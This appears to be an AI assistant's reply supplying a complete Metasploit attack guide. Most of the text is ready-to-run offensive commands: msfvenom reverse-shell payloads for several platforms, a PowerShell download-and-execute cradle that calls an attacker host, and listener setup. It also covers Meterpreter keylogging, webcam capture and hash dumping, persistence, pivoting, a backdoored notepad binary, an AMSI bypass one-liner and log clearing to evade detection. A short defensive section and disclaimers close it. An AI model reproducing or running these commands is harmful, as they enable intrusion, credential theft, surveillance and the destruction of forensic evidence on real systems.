Here's the complete, consolidated `.md` file with all commands, details, and modern considerations for authorized penetration testing:

```markdown
# Comprehensive Metasploit Framework Guide (2025)

> **For authorized penetration testing only**  
> Always obtain written permission before testing any system.

---

## 1. Payload Generation with `msfvenom`

### Windows Payloads
```bash
# Staged (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe

# Stageless (x86)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload_stageless.exe

# HTTPS Transport (evasion)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe > payload_https.exe
```

### Linux Payloads
```bash
# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > payload.elf

# x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > payload_x86.elf
```

### macOS Payloads
```bash
# Mach-O x64
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f macho > payload.macho
```

### Web Payloads
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > payload.php

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx > payload.aspx
```

### Android Payloads
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > payload.apk
```

---

## 2. Payload Delivery Methods

### HTTP Server
```bash
# Python3
sudo python3 -m http.server 80 --directory /tmp

# PHP
php -S 0.0.0.0:80 -t /tmp
```

### SCP (Linux-to-Linux)
```bash
scp /tmp/payload.elf user@target:/tmp/
```

### PowerShell Download
```powershell
# From attacker machine
IEX(New-Object Net.WebClient).DownloadString("http://<IP>/payload.ps1")
```

---

## 3. Listener Configuration

### Basic TCP Listener
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
set ExitOnSession false
exploit -j
```

### HTTPS Listener (Better Evasion)
```bash
set PAYLOAD windows/x64/meterpreter/reverse_https
set LPORT 443
set HandlerSSLCert /path/to/cert.pem  # Optional for SSL
set StagerVerifySSLCert true
exploit -j
```

---

## 4. Meterpreter Session Management

### Session Interaction
```bash
sessions -l          # List sessions
sessions -i 1        # Interact with session 1
background           # Background current session
```

### Common Commands
| Command               | Description                          |
|-----------------------|--------------------------------------|
| `sysinfo`            | System information                   |
| `getuid`             | Current user context                 |
| `ps`                 | List running processes               |
| `migrate <PID>`      | Migrate to another process           |
| `hashdump`           | Dump SAM hashes (Admin required)     |
| `screenshot`         | Capture screen                       |
| `webcam_snap`        | Capture webcam image                 |
| `keyscan_start`      | Begin keylogging                     |

---

## 5. Post-Exploitation Modules

### Privilege Escalation
```bash
# Windows
use post/windows/escalate/getsystem
run

# Linux
use post/linux/escalate/sudo
run
```

### Persistence
```bash
# Windows
run persistence -U -i 60 -p 443 -r <IP>

# Linux
use post/linux/manage/sshkey_persistence
set SESSION 1
run
```

### Pivoting
```bash
# Add route
run autoroute -s 192.168.1.0/24

# Port scan through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443
run
```

---

## 6. Modern Evasion Techniques

### Obfuscation
```bash
# Encoder (basic)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x64/zutto_dekiru -i 3 -f exe > encoded.exe

# Template injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -x /usr/share/windows-binaries/notepad.exe -f exe > notepad_backdoor.exe
```

### AV/EDR Bypass Tips
1. **Use HTTPS** over TCP
2. **Sleep timing**: Add delays in payloads
3. **Process injection**: Migrate to trusted processes
4. **AMSI bypass**: For Windows targets
   ```powershell
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```

---

## 7. Cleanup Procedures

### Remove Artifacts
```bash
# Meterpreter
rm payload.exe
clearev  # Clear logs

# Linux
rm -f /tmp/payload.elf
```

### Kill Handlers
```bash
jobs -K
```

---

## 8. Defensive Countermeasures

### Detection Signatures
- **Network**: Unusual HTTPS connections to non-C2 domains
- **Endpoint**: Unsigned binaries creating network connections
- **Behavior**: Process injection, credential dumping

### Mitigations
| Platform | Protection                          |
|----------|-------------------------------------|
| Windows  | Enable ASR rules, LSA Protection    |
| Linux    | Auditd for process execution        |
| macOS    | Enable SIP and Gatekeeper           |

---

## Legal & Ethical Reminder
- **Always** operate within authorized scope
- Document all actions for reporting
- Avoid production systems unless explicitly permitted
- Respect privacy and data protection laws

> **Note**: This guide assumes proper authorization. Unauthorized testing is illegal.
```

### Key Features:
1. **Complete Workflow**: From payload generation to cleanup
2. **Modern Techniques**: HTTPS transports, process injection, AMSI bypass
3. **Multi-Platform**: Windows/Linux/macOS/Android coverage
4. **Defensive Perspective**: Includes detection methods and mitigations
5. **Legal Compliance**: Clear authorization requirements emphasized

This document provides everything needed for authorized penetration testing while maintaining operational security and legal compliance. Let me know if you need any modifications for your specific testing environment.